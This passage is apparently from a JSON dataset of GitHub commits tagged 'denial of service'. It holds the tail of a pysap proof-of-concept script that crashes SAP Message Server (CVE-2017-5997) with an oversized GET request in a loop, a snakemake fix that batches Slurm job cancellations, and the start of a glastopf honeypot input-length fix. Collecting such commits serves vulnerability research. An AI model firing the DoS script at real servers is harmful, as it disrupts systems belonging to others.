(ms.sapJ45_SCS01) score 243 or sacrifice child\n[4721576.189058] Killed process 14223 (ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB\n\nexample \npython ms_server_denial_of_service.py -d SAP_SERVER -p 8101 --route-string ROUTE_STRING -v\n\"\"\"\n\n# Standard imports\nimport logging\nfrom time import sleep\nfrom socket import error as SocketError\nfrom optparse import OptionParser, OptionGroup\n# External imports\nfrom pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop\nfrom scapy.layers.inet import TCP\nfrom scapy.packet import Raw\nfrom scapy.config import conf\nimport requests\n# Custom imports\nimport pysap\n\n\n# Set the verbosity to 0\nconf.verb = 0\n\n\n# Command line options parser\ndef parse_options():\n\n    description = \"This example script can be used to tests against CVE-2017-5997 Denial of Service vulnerability\" \\\n                  \"affecting the Message Server. For more details about the vulnerability see Advisory \" \\\n                  \"https:\/\/erpscan.com\/advisories\/erpscan-16-038-sap-message-server-http-remote-dos\/.\"\n\n    epilog = \"pysap %(version)s - %(url)s - %(repo)s\" % {\"version\": pysap.__version__,\n                                                         \"url\": pysap.__url__,\n                                                         \"repo\": pysap.__repo__}\n\n    usage = \"Usage: %prog [options] -d <remote host>\"\n\n    parser = OptionParser(usage=usage, description=description, epilog=epilog)\n\n    target = OptionGroup(parser, \"Target\")\n    target.add_option(\"-d\", \"--remote-host\", dest=\"remote_host\",\n                      help=\"Remote host\")\n    target.add_option(\"-p\", \"--remote-port\", dest=\"remote_port\", type=\"int\", default=8101,\n                      help=\"Remote port [%default]\")\n    target.add_option(\"--route-string\", dest=\"route_string\",\n                      help=\"Route string for connecting through a SAP Router\")\n    parser.add_option_group(target)\n\n    misc = OptionGroup(parser, \"Misc options\")\n    misc.add_option(\"-l\", \"--loop\", dest=\"loop\", action=\"store_true\", default=False,\n                    help=\"Loop until the user cancel (Ctrl+C) [%default]\")\n    misc.add_option(\"-n\", \"--number\", dest=\"number\", type=\"int\", default=10,\n                    help=\"Number of packets to send [%default]\")\n    misc.add_option(\"-t\", \"--time\", dest=\"delay\", type=\"float\", default=5,\n                    help=\"Time to wait between each round [%default]\")\n    misc.add_option(\"-v\", \"--verbose\", dest=\"verbose\", action=\"store_true\", default=False,\n                    help=\"Verbose output [%default]\")\n    misc.add_option(\"--terminal\", dest=\"terminal\", default=None,\n                    help=\"Terminal name\")\n    parser.add_option_group(misc)\n\n    (options, _) = parser.parse_args()\n\n    if not (options.remote_host or options.route_string):\n        parser.error(\"Remote host or route string is required\")\n\n    return options\n\ndef send_crash(host, port, item, verbose, route=None):\n    # Create the connection to the SAP Netweaver server\n    if verbose:\n        print(\"[*] Sending crash\")\n    # Initiate the connection\n    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route, talk_mode=1)\n    conn.send(item)\n    conn.close()\n\n# Main function\ndef main():\n    options = parse_options()\n\n    if options.verbose:\n        logging.basicConfig(level=logging.DEBUG)\n\n    print(\"[*] Testing Message Server CVE-2017-5997 DoS vulnerability on host %s:%d\" % (options.remote_host,\n                                                                                        options.remote_port))\n\n    # Crafting the item\n\n    item = \"GET \/msgserver\/html\/group?group=\" + \"A\" * 65000 + \" HTTP\/1.0\\r\\n\"\n\n    try:\n        if options.loop:\n            try:\n                while True:\n                    send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)\n                    sleep(options.delay)\n            except KeyboardInterrupt:\n                print(\"[*] Cancelled by the user\")\n        else:\n            for i in range(options.number):\n                send_crash(options.remote_host, options.remote_port, item, options.verbose, options.route_string)\n                sleep(options.delay)\n\n    except SocketError:\n        print(\"[*] Connection error, take a look at the message server process !\")\n\n\nif __name__ == \"__main__\":\n    main()\n"}},"msg":"Update ms_server_denial_of_service.py"}},"https:\/\/github.com\/snakemake\/snakemake":{"0b1fe312e8c98a814b1c419940f35253f58f958e":{"url":"https:\/\/api.github.com\/repos\/snakemake\/snakemake\/commits\/0b1fe312e8c98a814b1c419940f35253f58f958e","html_url":"https:\/\/github.com\/snakemake\/snakemake\/commit\/0b1fe312e8c98a814b1c419940f35253f58f958e","message":"fix: batch collect jobs for scancel (#2114)\n\n### Description\r\n\r\nWhen using --slurm, exiting snakemake by SIGINT or ctrl-c helpfully\r\ncancels spawned jobs. However, this is quite unreliable as it often\r\nhangs for a few minutes and exits without canceling the jobs in the end\r\n(without indicating that it failed either).\r\n\r\nSlurm documentation on\r\n[scancel](https:\/\/slurm.schedmd.com\/scancel.html#SECTION_PERFORMANCE)\r\nnotes that a large number of scancel calls at the same time may result\r\nin denial of service.\r\n\r\nSnakemake runs scancel on each job\r\n[individually](https:\/\/github.com\/snakemake\/snakemake\/blob\/main\/snakemake\/executors\/slurm\/slurm_submit.py#L136).\r\nInstead, job ids should be collected and cancelled all at once.\r\n\r\nfixes #2113\r\n\r\n### QC\r\n* [X] The PR contains a test case for the changes or the changes are\r\nalready covered by an existing test case.\r\n* [X] The documentation (`docs\/`) is updated to reflect the changes or\r\nthis is not necessary (e.g. if the change does neither modify the\r\nlanguage nor the behavior or functionalities of Snakemake).\r\n\r\nCo-authored-by: Johannes K\u00f6ster <johannes.koester@tu-dortmund.de>","sha":"0b1fe312e8c98a814b1c419940f35253f58f958e","keyword":"denial of service update","diff":"diff --git a\/snakemake\/executors\/slurm\/slurm_submit.py b\/snakemake\/executors\/slurm\/slurm_submit.py\nindex ddc4e4b09..b94bf0af0 100644\n--- a\/snakemake\/executors\/slurm\/slurm_submit.py\n+++ b\/snakemake\/executors\/slurm\/slurm_submit.py\n@@ -134,22 +134,23 @@ def additional_general_args(self):\n         return [\" --slurm-jobstep\", \"--jobs 1\"]\n \n     def cancel(self):\n-        for job in self.active_jobs:\n-            jobid = job.jobid\n+        # Jobs are collected to reduce load on slurmctld\n+        jobids = \" \".join([job.jobid for job in self.active_jobs])\n+        if len(jobids) > 0:\n             try:\n                 # timeout set to 60, because a scheduler cycle usually is\n                 # about 30 sec, but can be longer in extreme cases.\n                 # Under 'normal' circumstances, 'scancel' is executed in\n                 # virtually no time.\n                 subprocess.check_output(\n-                    f\"scancel {jobid}\",\n+                    f\"scancel {jobids}\",\n                     text=True,\n                     shell=True,\n                     timeout=60,\n                     stderr=subprocess.PIPE,\n                 )\n             except subprocess.TimeoutExpired:\n-                logger.warning(f\"Unable to cancel job {jobid} within a minute.\")\n+                logger.warning(f\"Unable to cancel jobs within a minute.\")\n         self.shutdown()\n \n     def get_account_arg(self, job):\n","files":{"\/snakemake\/executors\/slurm\/slurm_submit.py":{"changes":[{"diff":"\n         return [\" --slurm-jobstep\", \"--jobs 1\"]\n \n     def cancel(self):\n-        for job in self.active_jobs:\n-            jobid = job.jobid\n+        # Jobs are collected to reduce load on slurmctld\n+        jobids = \" \".join([job.jobid for job in self.active_jobs])\n+        if len(jobids) > 0:\n             try:\n                 # timeout set to 60, because a scheduler cycle usually is\n                 # about 30 sec, but can be longer in extreme cases.\n                 # Under 'normal' circumstances, 'scancel' is executed in\n                 # virtually no time.\n                 subprocess.check_output(\n-                    f\"scancel {jobid}\",\n+                    f\"scancel {jobids}\",\n                     text=True,\n                     shell=True,\n                     timeout=60,\n                     stderr=subprocess.PIPE,\n                 )\n             except subprocess.TimeoutExpired:\n-                logger.warning(f\"Unable to cancel job {jobid} within a minute.\")\n+                logger.warning(f\"Unable to cancel jobs within a minute.\")\n         self.shutdown()\n \n     def get_account_arg(self, job):\n","add":5,"remove":4,"filename":"\/snakemake\/executors\/slurm\/slurm_submit.py","badparts":["        for job in self.active_jobs:","            jobid = job.jobid","                    f\"scancel {jobid}\",","                logger.warning(f\"Unable to cancel job {jobid} within a minute.\")"],"goodparts":["        jobids = \" \".join([job.jobid for job in self.active_jobs])","        if len(jobids) > 0:","                    f\"scancel {jobids}\",","                logger.warning(f\"Unable to cancel jobs within a minute.\")"]}],"source":"\nfrom collections import namedtuple from functools import partial import os import re import stat import sys import time import shlex import shutil import subprocess import tarfile import tempfile from snakemake.jobs import Job from snakemake.logging import logger from snakemake.exceptions import print_exception from snakemake.exceptions import log_verbose_traceback from snakemake.exceptions import WorkflowError from snakemake.executors import ClusterExecutor from snakemake.utils import makedirs from snakemake.io import get_wildcard_names, Wildcards from snakemake.common import async_lock SlurmJob=namedtuple(\"SlurmJob\", \"job jobid callback error_callback slurm_logfile\") def get_account(): \"\"\" tries to deduce the acccount from recent jobs, returns None, if none is found \"\"\" cmd=f'sacct -nu \"{os.environ[\"USER\"]}\" -o Account%20 | head -n1' try: sacct_out=subprocess.check_output( cmd, shell=True, text=True, stderr=subprocess.PIPE ) return sacct_out.strip() except subprocess.CalledProcessError as e: logger.warning( f\"No account was given, not able to get a SLURM account via sacct:{e.stderr}\" ) return None def test_account(account): \"\"\" tests whether the given account is registered, raises an error, if not \"\"\" cmd=f'sacctmgr -n -s list user \"{os.environ[\"USER\"]}\" format=account%20' try: accounts=subprocess.check_output( cmd, shell=True, text=True, stderr=subprocess.PIPE ) except subprocess.CalledProcessError as e: raise WorkflowError( f\"Unable to test the validity of the given or guessed SLURM account '{account}' with sacctmgr:{e.stderr}\" ) accounts=accounts.split() if account not in accounts: raise WorkflowError( f\"The given account{account} appears to be invalid. Available accounts:\\n{', '.join(accounts)}\" ) def get_default_partition(job): \"\"\" if no partition is given, checks whether a fallback onto a default partition is possible \"\"\" try: out=subprocess.check_output( r\"sinfo -o %P\", shell=True, text=True, stderr=subprocess.PIPE ) except subprocess.CalledProcessError as e: raise WorkflowError( f\"Failed to run sinfo for retrieval of cluster partitions:{e.stderr}\" ) for partition in out.split(): if \"*\" in partition: return partition.replace(\"*\", \"\") logger.warning( f\"No partition was given for rule '{job}', and unable to find a default partition.\" \" Trying to submit without partition information.\" \" You may want to invoke snakemake with --default-resources 'slurm_partition=<your default partition>'.\" ) return \"\" class SlurmExecutor(ClusterExecutor): \"\"\" the SLURM_Executor abstracts execution on SLURM clusters using snakemake resource string \"\"\" def __init__( self, workflow, dag, cores, jobname=\"snakejob_{name}_{jobid}\", printreason=False, quiet=False, printshellcmds=False, restart_times=0, max_status_checks_per_second=0.03, cluster_config=None, ): super().__init__( workflow, dag, cores, jobname=jobname, printreason=printreason, quiet=quiet, printshellcmds=printshellcmds, cluster_config=cluster_config, restart_times=restart_times, assume_shared_fs=True, max_status_checks_per_second=max_status_checks_per_second, ) self._fallback_account_arg=None self._fallback_partition=None def additional_general_args(self): return[\" --slurm-jobstep\", \"--jobs 1\"] def cancel(self): for job in self.active_jobs: jobid=job.jobid try: subprocess.check_output( f\"scancel{jobid}\", text=True, shell=True, timeout=60, stderr=subprocess.PIPE, ) except subprocess.TimeoutExpired: logger.warning(f\"Unable to cancel job{jobid} within a minute.\") self.shutdown() def get_account_arg(self, job): \"\"\" checks whether the desired account is valid, returns a default account, if applicable else raises an error -implicetly. \"\"\" if job.resources.get(\"slurm_account\"): test_account(job.resources.slurm_account) return f\" -A{job.resources.slurm_account}\" else: if self._fallback_account_arg is None: logger.warning(\"No SLURM account given, trying to guess.\") account=get_account() if account: logger.warning(f\"Guessed SLURM account:{account}\") self._fallback_account_arg=f\" -A{account}\" else: logger.warning( \"Unable to guess SLURM account. Trying to proceed without.\" ) self._fallback_account_arg=( \"\" ) return self._fallback_account_arg def get_partition_arg(self, job): \"\"\" checks whether the desired partition is valid, returns a default partition, if applicable else raises an error -implicetly. \"\"\" if job.resources.get(\"slurm_partition\"): partition=job.resources.slurm_partition else: if self._fallback_partition is None: self._fallback_partition=get_default_partition(job) partition=self._fallback_partition if partition: return f\" -p{partition}\" else: return \"\" def run(self, job, callback=None, submit_callback=None, error_callback=None): super()._run(job) jobid=job.jobid log_folder=f\"group_{job.name}\" if job.is_group() else f\"rule_{job.name}\" slurm_logfile=f\".snakemake\/slurm_logs\/{log_folder}\/%j.log\" os.makedirs(os.path.dirname(slurm_logfile), exist_ok=True) call=f\"sbatch -J{self.get_jobname(job)} -o{slurm_logfile} --export=ALL\" call +=self.get_account_arg(job) call +=self.get_partition_arg(job) if job.resources.get(\"runtime\"): call +=f\" -t{job.resources.runtime}\" else: logger.warning( \"No wall time information given. This might or might not work on your cluster. \" \"If not, specify the resource runtime in your rule or as a reasonable \" \"default via --default-resources.\" ) if job.resources.get(\"constraint\"): call +=f\" -C{job.resources.constraint}\" if job.resources.get(\"mem_mb_per_cpu\"): call +=f\" --mem-per-cpu{job.resources.mem_mb_per_cpu}\" elif job.resources.get(\"mem_mb\"): call +=f\" --mem{job.resources.mem_mb}\" else: logger.warning( \"No job memory information('mem_mb' or 'mem_mb_per_cpu') is given \" \"-submitting without. This might or might not work on your cluster.\" ) if job.resources.get(\"mpi\", False): if job.resources.get(\"nodes\", False): call +=f\" --nodes={job.resources.get('nodes', 1)}\" if job.resources.get(\"tasks\", False): call +=f\" --ntasks={job.resources.get('tasks', 1)}\" cpus_per_task=job.threads if job.resources.get(\"cpus_per_task\"): if not isinstance(cpus_per_task, int): raise WorkflowError( \"cpus_per_task must be an integer, but is{}\".format(cpus_per_task) ) cpus_per_task=job.resources.cpus_per_task cpus_per_task=max(1, cpus_per_task) call +=f\" --cpus-per-task={cpus_per_task}\" if job.resources.get(\"slurm_extra\"): call +=f\"{job.resources.slurm_extra}\" exec_job=self.format_job_exec(job) call +=f\" -D{self.workflow.workdir_init}\" call +=f\" --wrap={shlex.quote(exec_job)}\" logger.debug(f\"sbatch call:{call}\") try: out=subprocess.check_output( call, shell=True, text=True, stderr=subprocess.STDOUT ).strip() except subprocess.CalledProcessError as e: raise WorkflowError( f\"SLURM job submission failed. The error message was{e.output}\" ) slurm_jobid=out.split(\" \")[-1] slurm_logfile=slurm_logfile.replace(\"%j\", slurm_jobid) logger.info( f\"Job{jobid} has been submitted with SLURM jobid{slurm_jobid}(log:{slurm_logfile}).\" ) self.active_jobs.append( SlurmJob(job, slurm_jobid, callback, error_callback, slurm_logfile) ) async def job_status(self, jobid: int): \"\"\" obtain SLURM job status of submitted jobs \"\"\" STATUS_ATTEMPTS=10 res=None for i in range(STATUS_ATTEMPTS): async with self.status_rate_limiter: sacct_error=None try: sacct_cmd=f\"sacct -P -n --format=JobIdRaw,State -j{jobid}\" sacct_res=subprocess.check_output( sacct_cmd, text=True, shell=True, stderr=subprocess.PIPE ) logger.debug(f\"The sacct output is: '{sacct_res}'\") res={ x.split(\"|\")[0]: x.split(\"|\")[1] for x in sacct_res.strip().split(\"\\n\") } break except subprocess.CalledProcessError as e: sacct_error=e.stderr pass except IndexError as e: pass if not res: try: sctrl_cmd=f\"scontrol show jobid -dd{jobid}\" out=subprocess.check_output( sctrl_cmd, shell=True, stderr=subprocess.PIPE, text=True, ) logger.debug(f\"The scontrol output is: '{out}'\") m=re.search(r\"JobState=(\\w+)\", out) res={jobid: m.group(1)} break except subprocess.CalledProcessError as e: def fmt_err(err_type, err_msg): if err_msg is not None: return f\"\\n {err_type} error:{err_msg.strip()}\" else: return \"\" logger.error( f\"Error getting status of slurm job{jobid}:{fmt_err('sacct', sacct_error)}{fmt_err('scontrol', e.stderr)}\" ) if i >=STATUS_ATTEMPTS -1: raise WorkflowError(\"Unable to query job status for 10 times\") return res[jobid] async def _wait_for_jobs(self): fail_stati=( \"BOOT_FAIL\", \"OUT_OF_MEMORY\", \"CANCELLED\", \"FAILED\", \"NODE_FAIL\", \"DEADLINE\", \"PREEMPTED\", \"TIMEOUT\", \"ERROR\", ) while True: async with async_lock(self.lock): if not self.wait: return active_jobs=self.active_jobs self.active_jobs=list() still_running=list() for j in active_jobs: status=await self.job_status(j.jobid) if status==\"COMPLETED\": j.callback(j.job) elif status==\"UNKNOWN\": j.callback(j.job) elif status in fail_stati: self.print_job_error( j.job, msg=f\"SLURM-job '{j.jobid}' failed, SLURM status is: '{status}'\", aux_logs=[j.slurm_logfile], ) j.error_callback(j.job) else: still_running.append(j) async with async_lock(self.lock): self.active_jobs.extend(still_running) time.sleep(1 \/ self.max_status_checks_per_second) ","sourceWithComments":"from collections import namedtuple\nfrom functools import partial\nimport os\nimport re\nimport stat\nimport sys\nimport time\nimport shlex\nimport shutil\nimport subprocess\nimport tarfile\nimport tempfile\n\nfrom snakemake.jobs import Job\nfrom snakemake.logging import logger\nfrom snakemake.exceptions import print_exception\nfrom snakemake.exceptions import log_verbose_traceback\nfrom snakemake.exceptions import WorkflowError\nfrom snakemake.executors import ClusterExecutor\nfrom snakemake.utils import makedirs\nfrom snakemake.io import get_wildcard_names, Wildcards\nfrom snakemake.common import async_lock\n\nSlurmJob = namedtuple(\"SlurmJob\", \"job jobid callback error_callback slurm_logfile\")\n\n\ndef get_account():\n    \"\"\"\n    tries to deduce the acccount from recent jobs,\n    returns None, if none is found\n    \"\"\"\n    cmd = f'sacct -nu \"{os.environ[\"USER\"]}\" -o Account%20 | head -n1'\n    try:\n        sacct_out = subprocess.check_output(\n            cmd, shell=True, text=True, stderr=subprocess.PIPE\n        )\n        return sacct_out.strip()\n    except subprocess.CalledProcessError as e:\n        logger.warning(\n            f\"No account was given, not able to get a SLURM account via sacct: {e.stderr}\"\n        )\n        return None\n\n\ndef test_account(account):\n    \"\"\"\n    tests whether the given account is registered, raises an error, if not\n    \"\"\"\n    cmd = f'sacctmgr -n -s list user \"{os.environ[\"USER\"]}\" format=account%20'\n    try:\n        accounts = subprocess.check_output(\n            cmd, shell=True, text=True, stderr=subprocess.PIPE\n        )\n    except subprocess.CalledProcessError as e:\n        raise WorkflowError(\n            f\"Unable to test the validity of the given or guessed SLURM account '{account}' with sacctmgr: {e.stderr}\"\n        )\n\n    accounts = accounts.split()\n\n    if account not in accounts:\n        raise WorkflowError(\n            f\"The given account {account} appears to be invalid. Available accounts:\\n{', '.join(accounts)}\"\n        )\n\n\ndef get_default_partition(job):\n    \"\"\"\n    if no partition is given, checks whether a fallback onto a default partition is possible\n    \"\"\"\n    try:\n        out = subprocess.check_output(\n            r\"sinfo -o %P\", shell=True, text=True, stderr=subprocess.PIPE\n        )\n    except subprocess.CalledProcessError as e:\n        raise WorkflowError(\n            f\"Failed to run sinfo for retrieval of cluster partitions: {e.stderr}\"\n        )\n    for partition in out.split():\n        # a default partition is marked with an asterisk, but this is not part of the name\n        if \"*\" in partition:\n            # the decode-call is necessary, because the output of sinfo is bytes\n            return partition.replace(\"*\", \"\")\n    logger.warning(\n        f\"No partition was given for rule '{job}', and unable to find a default partition.\"\n        \" Trying to submit without partition information.\"\n        \" You may want to invoke snakemake with --default-resources 'slurm_partition=<your default partition>'.\"\n    )\n    return \"\"\n\n\nclass SlurmExecutor(ClusterExecutor):\n    \"\"\"\n    the SLURM_Executor abstracts execution on SLURM\n    clusters using snakemake resource string\n    \"\"\"\n\n    def __init__(\n        self,\n        workflow,\n        dag,\n        cores,\n        jobname=\"snakejob_{name}_{jobid}\",\n        printreason=False,\n        quiet=False,\n        printshellcmds=False,\n        restart_times=0,\n        max_status_checks_per_second=0.03,\n        cluster_config=None,\n    ):\n        super().__init__(\n            workflow,\n            dag,\n            cores,\n            jobname=jobname,\n            printreason=printreason,\n            quiet=quiet,\n            printshellcmds=printshellcmds,\n            cluster_config=cluster_config,\n            restart_times=restart_times,\n            assume_shared_fs=True,\n            max_status_checks_per_second=max_status_checks_per_second,\n        )\n        self._fallback_account_arg = None\n        self._fallback_partition = None\n\n    def additional_general_args(self):\n        # we need to set -j to 1 here, because the behaviour\n        # of snakemake is to submit all jobs at once, otherwise.\n        # However, the SLURM Executor is supposed to submit jobs\n        # one after another, so we need to set -j to 1 for the\n        # JobStep Executor, which in turn handles the launch of\n        # SLURM jobsteps.\n        return [\" --slurm-jobstep\", \"--jobs 1\"]\n\n    def cancel(self):\n        for job in self.active_jobs:\n            jobid = job.jobid\n            try:\n                # timeout set to 60, because a scheduler cycle usually is\n                # about 30 sec, but can be longer in extreme cases.\n                # Under 'normal' circumstances, 'scancel' is executed in\n                # virtually no time.\n                subprocess.check_output(\n                    f\"scancel {jobid}\",\n                    text=True,\n                    shell=True,\n                    timeout=60,\n                    stderr=subprocess.PIPE,\n                )\n            except subprocess.TimeoutExpired:\n                logger.warning(f\"Unable to cancel job {jobid} within a minute.\")\n        self.shutdown()\n\n    def get_account_arg(self, job):\n        \"\"\"\n        checks whether the desired account is valid,\n        returns a default account, if applicable\n        else raises an error - implicetly.\n        \"\"\"\n        if job.resources.get(\"slurm_account\"):\n            # here, we check whether the given or guessed account is valid\n            # if not, a WorkflowError is raised\n            test_account(job.resources.slurm_account)\n            return f\" -A {job.resources.slurm_account}\"\n        else:\n            if self._fallback_account_arg is None:\n                logger.warning(\"No SLURM account given, trying to guess.\")\n                account = get_account()\n                if account:\n                    logger.warning(f\"Guessed SLURM account: {account}\")\n                    self._fallback_account_arg = f\" -A {account}\"\n                else:\n                    logger.warning(\n                        \"Unable to guess SLURM account. Trying to proceed without.\"\n                    )\n                    self._fallback_account_arg = (\n                        \"\"  # no account specific args for sbatch\n                    )\n            return self._fallback_account_arg\n\n    def get_partition_arg(self, job):\n        \"\"\"\n        checks whether the desired partition is valid,\n        returns a default partition, if applicable\n        else raises an error - implicetly.\n        \"\"\"\n        if job.resources.get(\"slurm_partition\"):\n            partition = job.resources.slurm_partition\n        else:\n            if self._fallback_partition is None:\n                self._fallback_partition = get_default_partition(job)\n            partition = self._fallback_partition\n        if partition:\n            return f\" -p {partition}\"\n        else:\n            return \"\"\n\n    def run(self, job, callback=None, submit_callback=None, error_callback=None):\n        super()._run(job)\n        jobid = job.jobid\n\n        log_folder = f\"group_{job.name}\" if job.is_group() else f\"rule_{job.name}\"\n\n        slurm_logfile = f\".snakemake\/slurm_logs\/{log_folder}\/%j.log\"\n        os.makedirs(os.path.dirname(slurm_logfile), exist_ok=True)\n\n        # generic part of a submission string:\n        call = f\"sbatch -J {self.get_jobname(job)} -o {slurm_logfile} --export=ALL\"\n\n        call += self.get_account_arg(job)\n        call += self.get_partition_arg(job)\n\n        if job.resources.get(\"runtime\"):\n            call += f\" -t {job.resources.runtime}\"\n        else:\n            logger.warning(\n                \"No wall time information given. This might or might not work on your cluster. \"\n                \"If not, specify the resource runtime in your rule or as a reasonable \"\n                \"default via --default-resources.\"\n            )\n\n        if job.resources.get(\"constraint\"):\n            call += f\" -C {job.resources.constraint}\"\n        if job.resources.get(\"mem_mb_per_cpu\"):\n            call += f\" --mem-per-cpu {job.resources.mem_mb_per_cpu}\"\n        elif job.resources.get(\"mem_mb\"):\n            call += f\" --mem {job.resources.mem_mb}\"\n        else:\n            logger.warning(\n                \"No job memory information ('mem_mb' or 'mem_mb_per_cpu') is given \"\n                \"- submitting without. This might or might not work on your cluster.\"\n            )\n\n        # MPI job\n        if job.resources.get(\"mpi\", False):\n            if job.resources.get(\"nodes\", False):\n                call += f\" --nodes={job.resources.get('nodes', 1)}\"\n            if job.resources.get(\"tasks\", False):\n                call += f\" --ntasks={job.resources.get('tasks', 1)}\"\n\n        cpus_per_task = job.threads\n        if job.resources.get(\"cpus_per_task\"):\n            if not isinstance(cpus_per_task, int):\n                raise WorkflowError(\n                    \"cpus_per_task must be an integer, but is {}\".format(cpus_per_task)\n                )\n            cpus_per_task = job.resources.cpus_per_task\n        # ensure that at least 1 cpu is requested\n        # because 0 is not allowed by slurm\n        cpus_per_task = max(1, cpus_per_task)\n        call += f\" --cpus-per-task={cpus_per_task}\"\n\n        if job.resources.get(\"slurm_extra\"):\n            call += f\" {job.resources.slurm_extra}\"\n\n        exec_job = self.format_job_exec(job)\n        # ensure that workdir is set correctly\n        # use short argument as this is the same in all slurm versions\n        # (see https:\/\/github.com\/snakemake\/snakemake\/issues\/2014)\n        call += f\" -D {self.workflow.workdir_init}\"\n        # and finally the job to execute with all the snakemake parameters\n        call += f\" --wrap={shlex.quote(exec_job)}\"\n\n        logger.debug(f\"sbatch call: {call}\")\n        try:\n            out = subprocess.check_output(\n                call, shell=True, text=True, stderr=subprocess.STDOUT\n            ).strip()\n        except subprocess.CalledProcessError as e:\n            raise WorkflowError(\n                f\"SLURM job submission failed. The error message was {e.output}\"\n            )\n\n        slurm_jobid = out.split(\" \")[-1]\n        slurm_logfile = slurm_logfile.replace(\"%j\", slurm_jobid)\n        logger.info(\n            f\"Job {jobid} has been submitted with SLURM jobid {slurm_jobid} (log: {slurm_logfile}).\"\n        )\n        self.active_jobs.append(\n            SlurmJob(job, slurm_jobid, callback, error_callback, slurm_logfile)\n        )\n\n    async def job_status(self, jobid: int):\n        \"\"\"\n        obtain SLURM job status of submitted jobs\n        \"\"\"\n        STATUS_ATTEMPTS = 10\n        res = None\n        # this code is inspired by the snakemake profile: TODO: link to github\n        for i in range(STATUS_ATTEMPTS):\n            # use self.status_rate_limiter to avoid too many API calls.\n            async with self.status_rate_limiter:\n                sacct_error = None\n                try:\n                    sacct_cmd = f\"sacct -P -n --format=JobIdRaw,State -j {jobid}\"\n                    sacct_res = subprocess.check_output(\n                        sacct_cmd, text=True, shell=True, stderr=subprocess.PIPE\n                    )\n                    logger.debug(f\"The sacct output is: '{sacct_res}'\")\n                    res = {\n                        x.split(\"|\")[0]: x.split(\"|\")[1]\n                        for x in sacct_res.strip().split(\"\\n\")\n                    }\n                    break\n                except subprocess.CalledProcessError as e:\n                    sacct_error = e.stderr\n                    pass  # try scontrol below\n                except IndexError as e:\n                    pass\n                # Try getting job with scontrol instead in case sacct is misconfigured\n                if not res:\n                    try:\n                        sctrl_cmd = f\"scontrol show jobid -dd {jobid}\"\n                        out = subprocess.check_output(\n                            sctrl_cmd,\n                            shell=True,\n                            stderr=subprocess.PIPE,\n                            text=True,\n                        )\n                        logger.debug(f\"The scontrol output is: '{out}'\")\n                        m = re.search(r\"JobState=(\\w+)\", out)\n                        res = {jobid: m.group(1)}\n                        break\n                    except subprocess.CalledProcessError as e:\n\n                        def fmt_err(err_type, err_msg):\n                            if err_msg is not None:\n                                return f\"\\n    {err_type} error: {err_msg.strip()}\"\n                            else:\n                                return \"\"\n\n                        logger.error(\n                            f\"Error getting status of slurm job {jobid}:{fmt_err('sacct', sacct_error)}{fmt_err('scontrol', e.stderr)}\"\n                        )\n\n                if i >= STATUS_ATTEMPTS - 1:\n                    raise WorkflowError(\"Unable to query job status for 10 times\")\n\n        return res[jobid]  # == status\n\n    async def _wait_for_jobs(self):\n        # busy wait on job completion\n        # This is only needed if your backend does not allow to use callbacks\n        # for obtaining job status.\n        fail_stati = (\n            \"BOOT_FAIL\",\n            \"OUT_OF_MEMORY\",\n            \"CANCELLED\",\n            \"FAILED\",\n            \"NODE_FAIL\",\n            \"DEADLINE\",\n            \"PREEMPTED\",\n            \"TIMEOUT\",\n            \"ERROR\",\n        )\n        while True:\n            # always use self.lock to avoid race conditions\n            async with async_lock(self.lock):\n                if not self.wait:\n                    return\n                active_jobs = self.active_jobs\n                self.active_jobs = list()\n                still_running = list()\n            for j in active_jobs:\n                status = await self.job_status(j.jobid)\n                if status == \"COMPLETED\":\n                    j.callback(j.job)\n                elif status == \"UNKNOWN\":\n                    # the job probably does not exist anymore, but 'sacct' did not work\n                    # so we assume it is finished\n                    j.callback(j.job)\n                elif status in fail_stati:\n                    self.print_job_error(\n                        j.job,\n                        msg=f\"SLURM-job '{j.jobid}' failed, SLURM status is: '{status}'\",\n                        aux_logs=[j.slurm_logfile],\n                    )\n                    j.error_callback(j.job)\n                else:  # still running?\n                    still_running.append(j)\n\n            async with async_lock(self.lock):\n                self.active_jobs.extend(still_running)\n            time.sleep(1 \/ self.max_status_checks_per_second)\n"}},"msg":"fix: batch collect jobs for scancel (#2114)\n\n### Description\r\n\r\nWhen using --slurm, exiting snakemake by SIGINT or ctrl-c helpfully\r\ncancels spawned jobs. However, this is quite unreliable as it often\r\nhangs for a few minutes and exits without canceling the jobs in the end\r\n(without indicating that it failed either).\r\n\r\nSlurm documentation on\r\n[scancel](https:\/\/slurm.schedmd.com\/scancel.html#SECTION_PERFORMANCE)\r\nnotes that a large number of scancel calls at the same time may result\r\nin denial of service.\r\n\r\nSnakemake runs scancel on each job\r\n[individually](https:\/\/github.com\/snakemake\/snakemake\/blob\/main\/snakemake\/executors\/slurm\/slurm_submit.py#L136).\r\nInstead, job ids should be collected and cancelled all at once.\r\n\r\nfixes #2113\r\n\r\n### QC\r\n* [X] The PR contains a test case for the changes or the changes are\r\nalready covered by an existing test case.\r\n* [X] The documentation (`docs\/`) is updated to reflect the changes or\r\nthis is not necessary (e.g. if the change does neither modify the\r\nlanguage nor the behavior or functionalities of Snakemake).\r\n\r\nCo-authored-by: Johannes K\u00f6ster <johannes.koester@tu-dortmund.de>"}},"https:\/\/github.com\/r3p3r\/mushorg-glastopf":{"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34":{"url":"https:\/\/api.github.com\/repos\/r3p3r\/mushorg-glastopf\/commits\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","html_url":"https:\/\/github.com\/r3p3r\/mushorg-glastopf\/commit\/6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","message":"Improved comments handler to fix possible Denial of Service vulnerability","sha":"6c8f05d7e379fdd860a64b922ab3c1ad5485aa34","keyword":"denial of service improve","diff":"diff --git a\/glastopf\/modules\/handlers\/emulators\/comments.py b\/glastopf\/modules\/handlers\/emulators\/comments.py\nindex db7ed6b..bac1b99 100644\n--- a\/glastopf\/modules\/handlers\/emulators\/comments.py\n+++ b\/glastopf\/modules\/handlers\/emulators\/comments.py\n@@ -10,6 +10,9 @@\n \n \n class CommentPoster(base_emulator.BaseEmulator):\n+    MAX_COMMENT_LEN = 2048\n+    MAX_FILE_LEN = 33816700  # ~ 3MB\n+\n     def __init__(self, data_dir):\n         super(CommentPoster, self).__init__(data_dir)\n \n@@ -24,6 +27,9 @@ def handle(self, attack_event):\n             dork_page_list.remove('.git')\n         dork_page = choice(dork_page_list)\n         ip_address = 